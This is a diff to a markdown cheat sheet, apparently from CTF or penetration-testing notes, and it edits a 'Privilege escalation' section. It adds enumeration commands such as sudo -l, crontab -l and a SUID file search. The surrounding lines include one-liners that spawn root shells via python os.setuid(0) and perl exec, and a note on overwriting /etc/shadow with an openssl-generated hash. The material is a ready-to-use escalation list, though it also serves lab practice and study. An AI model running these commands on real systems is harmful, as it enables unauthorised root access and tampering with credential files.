@@ -1,12 +1,16 @@
 - ## Privilege escalation <a name="privilegeescalation"></a>
 [easy way to get root/root.txt](#root.txt)
-- `cat /etc/issue`
+- `sudo -l`
+- `bin/bash`
+- `crontab -l`
+- `find / -perm -u=s -type f 2>/dev/null`
 ```
 find / -o -group `id -g` -perm \ 
  -g=w -perm -u=s -o -perm -o=w\
  -perm -u=s -o -perm -o=w \
  -perm -g=s -ls
 ```
+
 - ```python3 -c 'import os; os.system("/bin/bash")'```
 - ```python -c 'import pty; pty.spawn("/bin/bash")'```
 - ```python -c 'import os; os.setuid(0); os.system("/bin/sh")'```
@@ -15,6 +19,8 @@ find / -o -group `id -g` -perm \ 
 exec "/bin/sh";
 perl —e 'exec "/bin/sh";'
 ```
+- `cat /etc/issue`
+
 > [!IMPORTANT]
 > - If you have permission to write /etc/shadow use the below commands
 > - First you need to creat a one hash password using openssl
